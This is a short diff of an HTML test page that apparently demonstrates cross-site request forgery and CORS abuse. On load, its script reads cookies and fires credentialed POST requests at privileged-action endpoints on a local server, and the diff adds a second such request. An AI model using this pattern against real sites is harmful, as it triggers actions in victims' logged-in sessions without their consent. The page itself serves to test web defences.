@@ -1,8 +1,7 @@
 <html>
   <head>
     <script>
-    // Trigger by Cross-Site scriptting - any javascript can be done here.
-    // base CSS case
+
     document.onload=get_cookie();
 
     function get_cookie(){
@@ -20,6 +19,14 @@
     document.onload=call_api();
     function call_api(){
       fetch ("http://localhost:9999/api/privaction",{
+        method: 'POST',
+        credentials: 'include'
+      })
+    }
+
+    document.onload=call_cors_api();
+    function call_cors_api(){
+      fetch ("http://localhost:9999/api/corsprivaction",{
         method: 'POST',
         credentials: 'include'
       })
